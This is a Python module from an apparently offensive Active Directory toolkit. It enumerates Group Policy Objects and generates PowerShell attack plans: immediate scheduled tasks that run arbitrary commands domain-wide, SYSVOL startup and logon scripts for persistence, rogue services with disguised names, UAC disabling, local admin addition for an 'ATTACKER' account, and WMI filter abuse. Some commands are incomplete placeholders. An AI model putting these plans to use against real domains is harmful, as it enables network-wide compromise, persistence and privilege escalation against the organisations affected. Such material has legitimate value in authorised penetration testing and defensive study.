"""GPO abuse module — Group Policy Object manipulation for AD persistence and privilege escalation.

Exploits Group Policy Objects through multiple vectors: GPO link enumeration,
SYSVOL file modification (immediate scheduled tasks), WMI filter abuse,
GPO ACL manipulation, and GPO-based software deployment.

GPO modifications propagate to all scoped computers/users — a single
compromised GPO can provide domain-wide persistence or privilege escalation.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

GPO_ABUSE_TECHNIQUES = [
    "ScheduledTask",
    "ImmediateTask",
    "StartupScript",
    "LogonScript",
    "SoftwareInstallation",
    "WMIFilter",
    "ServicesModification",
    "RegistryPreference",
    "FilePreference",
    "ShortcutPreference",
    "LocalUserGroup",
    "ACLModification",
    "GPLink",
    "GPOModification",
]

GPO_COMPONENTS = {
    "ScheduledTasks": "Machine/Preferences/ScheduledTasks/ScheduledTasks.xml",
    "ImmediateTasks": "Machine/Preferences/ScheduledTasks/ScheduledTasks.xml",
    "Services": "Machine/Preferences/Services/Services.xml",
    "Registry": "Machine/Preferences/Registry/Registry.xml",
    "Files": "Machine/Preferences/Files/Files.xml",
    "Shortcuts": "Machine/Preferences/Shortcuts/Shortcuts.xml",
    "LocalUsersGroups": "Machine/Preferences/Groups/Groups.xml",
    "ScriptsStartup": "Machine/Scripts/Startup/scripts.ini",
    "ScriptsLogon": "User/Scripts/Logon/scripts.ini",
    "SoftwareInstallation": "Machine/Applications/",
}

GPO_DEPLOYMENT_STATE = {
    0: "Disabled",
    1: "Enabled",
    2: "Enforced",
}


@dataclass
class GPOInfo:
    """Information about a Group Policy Object.

    Attributes:
        display_name: GPO display name.
        guid: GPO GUID.
        gpc_path: Group Policy Container path in AD.
        gpt_path: Group Policy Template path in SYSVOL.
        linked_ous: List of OUs this GPO is linked to.
        linked_sites: List of AD sites this GPO applies to.
        gpo_status: Enabled/Disabled/Enforced.
        applies_to: Computers or Users (or both).
        owner: Security principal that owns the GPO.
        interesting_acls: Non-default ACLs on the GPO.
    """

    display_name: str = ""
    guid: str = ""
    gpc_path: str = ""
    gpt_path: str = ""
    linked_ous: list[str] = field(default_factory=list)
    linked_sites: list[str] = field(default_factory=list)
    gpo_status: str = "Enabled"
    applies_to: str = "Computers"
    owner: str = ""
    interesting_acls: list[str] = field(default_factory=list)


@dataclass
class GPOAbusePlan:
    """Exploitation plan for an abusable GPO.

    Attributes:
        gpo_name: Target GPO display name.
        technique: Abuse technique from GPO_ABUSE_TECHNIQUES.
        payload_type: Type of payload to inject (command, script, registry, etc.).
        target_scope: Which computers/users will be affected.
        trigger_timing: When the GPO change takes effect (reboot, gpupdate, logon).
        commands: PowerShell/command-line exploitation commands.
        cleanup_commands: Commands to revert the abuse.
    """

    gpo_name: str = ""
    technique: str = ""
    payload_type: str = ""
    target_scope: str = ""
    trigger_timing: str = "Next gpupdate (90-120 min) or reboot"
    commands: list[str] = field(default_factory=list)
    cleanup_commands: list[str] = field(default_factory=list)


class GPOAbuseEngine:
    """Enumerate and exploit Group Policy Objects for AD compromise.

    Provides plans for GPO-based privilege escalation, persistence,
    lateral movement, and code execution across domain-joined hosts.

    Attributes:
        domain: Target domain FQDN.
        dc_ip: Domain controller IP.
        gpos: Discovered GPOs.
        abuse_plans: Generated exploitation plans.
    """

    def __init__(self, domain: str = "", dc_ip: str = ""):
        self.domain = domain
        self.dc_ip = dc_ip
        self.gpos: list[GPOInfo] = []
        self.abuse_plans: list[GPOAbusePlan] = []

    def parse_gpo_list(self, raw_gpo_output: str) -> list[GPOInfo]:
        """Parse Get-GPO or ldapsearch output for GPO information.

        Args:
            raw_gpo_output: Text output from GPO enumeration tools.

        Returns:
            List of parsed GPOInfo objects.
        """
        self.gpos = []
        lines = raw_gpo_output.split("\n")
        current_gpo: dict[str, Any] = {}

        for line in lines:
            line = line.strip()
            if not line:
                if current_gpo:
                    gpo = GPOInfo(
                        display_name=current_gpo.get("displayname", ""),
                        guid=current_gpo.get("id", ""),
                        gpc_path=f"CN={current_gpo.get('id', '')},CN=Policies,CN=System,DC={','.join(self.domain.split('.'))}",
                        gpt_path=f"\\\\{self.domain}\\SYSVOL\\{self.domain}\\Policies\\{current_gpo.get('id', '')}",
                        gpo_status=current_gpo.get("gpustatus", "Enabled"),
                    )
                    self.gpos.append(gpo)
                    current_gpo = {}
                continue

            if ":" in line:
                key, _, value = line.partition(":")
                key = key.strip().lower().replace(" ", "")
                value = value.strip()
                current_gpo[key] = value

        return self.gpos

    def parse_bloodhound_gpos(self, bloodhound_nodes: list[dict[str, Any]]) -> list[GPOInfo]:
        """Parse BloodHound GPO nodes for abusable policies.

        Args:
            bloodhound_nodes: List of BloodHound GPO node dicts.

        Returns:
            List of GPOInfo objects.
        """
        self.gpos = []
        for node in bloodhound_nodes:
            props = node.get("Properties", {}) if isinstance(node.get("Properties"), dict) else {}
            gpo = GPOInfo(
                display_name=props.get("name", ""),
                guid=props.get("guid", props.get("objectid", "")),
                gpc_path=props.get("distinguishedname", ""),
                gpo_status=props.get("gpostatus", "Enabled"),
                owner=props.get("owner", ""),
            )
            self.gpos.append(gpo)
        return self.gpos

    def plan_scheduled_task(self, gpo: GPOInfo, command: str, task_name: str = "SystemUpdate") -> GPOAbusePlan:
        """Plan a GPO-backed scheduled task for immediate code execution.

        Args:
            gpo: Target GPO.
            command: Command to execute on target machines.
            task_name: Task name in Task Scheduler.

        Returns:
            GPOAbusePlan with scheduled task deployment instructions.
        """
        return GPOAbusePlan(
            gpo_name=gpo.display_name,
            technique="ImmediateTask",
            payload_type="Scheduled Task",
            target_scope=f"All computers linked to {gpo.display_name}",
            trigger_timing="Next gpupdate or reboot",
            commands=[
                f'New-GPOImmediateTask -GPOName "{gpo.display_name}" -TaskName "{task_name}" -Command "cmd.exe" -CommandArgs "/c {command}"',
                "gpupdate /force /target:computer",
            ],
            cleanup_commands=[
                f'Remove-GPOImmediateTask -GPOName "{gpo.display_name}" -TaskName "{task_name}"',
            ],
        )

    def plan_startup_script(self, gpo: GPOInfo, script_content: str, script_name: str = "update.ps1") -> GPOAbusePlan:
        """Plan a GPO startup script for persistence via SYSVOL.

        Args:
            gpo: Target GPO.
            script_content: PowerShell script content to deploy.
            script_name: Script filename in SYSVOL.

        Returns:
            GPOAbusePlan with startup script deployment.
        """
        sysvol_path = f"\\\\{self.domain}\\SYSVOL\\{self.domain}\\Policies\\{gpo.guid}\\Machine\\Scripts\\Startup"
        return GPOAbusePlan(
            gpo_name=gpo.display_name,
            technique="StartupScript",
            payload_type="PowerShell Startup Script",
            target_scope=f"All computers linked to {gpo.display_name}",
            trigger_timing="On system boot",
            commands=[
                f"mkdir {sysvol_path}",
                f'Set-Content -Path "{sysvol_path}\\{script_name}" -Value "{script_content}"',
                f'Set-Content -Path "{sysvol_path}\\scripts.ini" -Value "[Startup]\\r\\n0CmdLine={script_name}\\r\\n0Parameters="',
                "gpupdate /force",
            ],
            cleanup_commands=[
                f"Remove-Item -Path \"{sysvol_path}\\{script_name}\" -Force",
                f"Remove-Item -Path \"{sysvol_path}\\scripts.ini\" -Force",
            ],
        )

    def plan_logon_script(self, gpo: GPOInfo, command: str) -> GPOAbusePlan:
        """Plan a GPO user logon script for user-triggered code execution.

        Args:
            gpo: Target GPO.
            command: Command to execute on user logon.

        Returns:
            GPOAbusePlan with logon script configuration.
        """
        sysvol_path = f"\\\\{self.domain}\\SYSVOL\\{self.domain}\\Policies\\{gpo.guid}\\User\\Scripts\\Logon"
        return GPOAbusePlan(
            gpo_name=gpo.display_name,
            technique="LogonScript",
            payload_type="Batch/PowerShell Logon Script",
            target_scope=f"All users linked to {gpo.display_name}",
            trigger_timing="On user logon",
            commands=[
                f"mkdir {sysvol_path}",
                f'Set-Content -Path "{sysvol_path}\\logon.bat" -Value "@echo off\\r\\n{command}"',
                f'Set-Content -Path "{sysvol_path}\\scripts.ini" -Value "[Logon]\\r\\n0CmdLine=logon.bat\\r\\n0Parameters="',
            ],
            cleanup_commands=[
                f"Remove-Item -Path \"{sysvol_path}\\logon.bat\" -Force",
                f"Remove-Item -Path \"{sysvol_path}\\scripts.ini\" -Force",
            ],
        )

    def plan_local_admin_addition(self, gpo: GPOInfo, username: str, group: str = "Administrators") -> GPOAbusePlan:
        """Plan adding a user to the local Administrators group via GPO preferences.

        Args:
            gpo: Target GPO.
            username: Username to add.
            group: Local group to add to (default: Administrators).

        Returns:
            GPOAbusePlan with local group modification.
        """
        return GPOAbusePlan(
            gpo_name=gpo.display_name,
            technique="LocalUserGroup",
            payload_type="GPO Preference - Groups.xml",
            target_scope=f"All computers linked to {gpo.display_name}",
            trigger_timing="Next gpupdate (90-120 min)",
            commands=[
                f'Set-GPPrefRegistryValue -Name "{gpo.display_name}" -Context Computer -Key "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -ValueName "EnableLUA" -Type DWORD -Value 0',
                f'Set-GPPrefRegistryValue -Name "{gpo.display_name}" -Context Computer -Action Update -Key "HKLM\\..."',
                "New-GPOImmediateTask or local admin addition via preferences",
            ],
            cleanup_commands=[
                f'Remove-GPPrefRegistryValue -Name "{gpo.display_name}" -Context Computer -Key "..."',
            ],
        )

    def plan_wmi_filter_abuse(self, gpo: GPOInfo, wmi_query: str) -> GPOAbusePlan:
        """Plan WMI filter abuse for targeted GPO scope control.

        Abusive WMI filters can scope a GPO to specific hosts dynamically.

        Args:
            gpo: Target GPO.
            wmi_query: WQL query for host targeting.

        Returns:
            GPOAbusePlan with WMI filter configuration.
        """
        filter_name = f"{gpo.display_name}_filter"
        return GPOAbusePlan(
            gpo_name=gpo.display_name,
            technique="WMIFilter",
            payload_type="WMI Filter",
            target_scope="Hosts matching the WMI query",
            trigger_timing="Next GPO evaluation cycle",
            commands=[
                f"New-ADObject -Name '{filter_name}' -Type 'msWMI-Som' -Path 'CN=SOM,CN=WMIPolicy,CN=System,DC={','.join(self.domain.split('.'))}'",
                f"Set-ADObject -Identity 'CN={filter_name},CN=SOM,CN=WMIPolicy,CN=System,DC={','.join(self.domain.split('.'))}' -Replace @{{msWMI-Query='{wmi_query}'}}",
                f"Set-GPInheritance -Target 'OU=Target,...' -Som '{filter_name}'",
            ],
            cleanup_commands=[
                f"Remove-ADObject -Identity 'CN={filter_name},CN=SOM,CN=WMIPolicy,CN=System,DC={','.join(self.domain.split('.'))}' -Recursive",
            ],
        )

    def plan_registry_preference(self, gpo: GPOInfo, registry_path: str, value_name: str, value_data: str, value_type: str = "REG_SZ") -> GPOAbusePlan:
        """Plan a registry modification via GPO preferences.

        Can enable RDP, disable firewall, add autorun entries, etc.

        Args:
            gpo: Target GPO.
            registry_path: Full registry key path.
            value_name: Value name to set.
            value_data: Value data.
            value_type: Registry value type.

        Returns:
            GPOAbusePlan with registry preference commands.
        """
        return GPOAbusePlan(
            gpo_name=gpo.display_name,
            technique="RegistryPreference",
            payload_type="GPO Preference - Registry.xml",
            target_scope=f"All computers/users linked to {gpo.display_name}",
            trigger_timing="Next gpupdate (90-120 min)",
            commands=[
                f'Set-GPPrefRegistryValue -Name "{gpo.display_name}" -Context Computer '
                f'-Key "{registry_path}" -ValueName "{value_name}" '
                f'-Value "{value_data}" -Type {value_type}',
            ],
            cleanup_commands=[
                f'Remove-GPPrefRegistryValue -Name "{gpo.display_name}" -Context Computer '
                f'-Key "{registry_path}" -ValueName "{value_name}"',
            ],
        )

    def plan_service_installation(self, gpo: GPOInfo, service_name: str, binary_path: str) -> GPOAbusePlan:
        """Plan a service installation via GPO for SYSTEM-level persistence.

        Args:
            gpo: Target GPO.
            service_name: Display name for the service.
            binary_path: Path to the service binary.

        Returns:
            GPOAbusePlan with service installation commands.
        """
        return GPOAbusePlan(
            gpo_name=gpo.display_name,
            technique="ServicesModification",
            payload_type="GPO Preference - Services.xml",
            target_scope=f"All computers linked to {gpo.display_name}",
            trigger_timing="On system boot (automatic start)",
            commands=[
                f'New-service -Name "{service_name}" -BinaryPathName "{binary_path}" -Description "System Helper" -StartupType Automatic',
                f'Set-GPPrefRegistryValue -Name "{gpo.display_name}" -Context Computer ...',
            ],
            cleanup_commands=[
                f'Remove-service -Name "{service_name}"',
            ],
        )

    def generate_all_plans(self, command: str, username: str = "ATTACKER") -> list[GPOAbusePlan]:
        """Generate all abuse plans for the discovered GPOs.

        Args:
            command: Payload command to execute.
            username: Attacker username for local admin addition.

        Returns:
            List of GPOAbusePlan for all GPOs and techniques.
        """
        self.abuse_plans = []

        for gpo in self.gpos:
            self.abuse_plans.extend([
                self.plan_scheduled_task(gpo, command),
                self.plan_startup_script(gpo, command),
                self.plan_logon_script(gpo, command),
                self.plan_local_admin_addition(gpo, username),
            ])

        return self.abuse_plans

    def detect_risky_gpos(self) -> list[dict[str, Any]]:
        """Identify GPOs with risky configurations for post-compromise cleanup.

        Scans for startup scripts, scheduled tasks, software installs,
        and other GPO settings that might indicate adversary persistence.

        Returns:
            List of risky GPO findings.
        """
        findings = []
        for gpo in self.gpos:
            indicators: list[str] = []
            if gpo.gpo_status != "Enabled":
                indicators.append("Disabled GPO — could be attacker-created backdoor")
            if not gpo.owner:
                indicators.append("Missing owner — potential orphaned GPO")

            if indicators:
                findings.append({
                    "gpo_name": gpo.display_name,
                    "guid": gpo.guid,
                    "indicators": indicators,
                })

        return findings

    def summary(self) -> dict[str, Any]:
        """Return a summary of GPO abuse capabilities.

        Returns:
            Dict with GPO count, techniques, and abuse plans.
        """
        return {
            "gpos_discovered": len(self.gpos),
            "techniques_available": GPO_ABUSE_TECHNIQUES,
            "abuse_plans_generated": len(self.abuse_plans),
            "gpo_details": [
                {
                    "name": g.display_name,
                    "guid": g.guid,
                    "status": g.gpo_status,
                    "linked_ous": g.linked_ous,
                }
                for g in self.gpos[:20]
            ],
        }
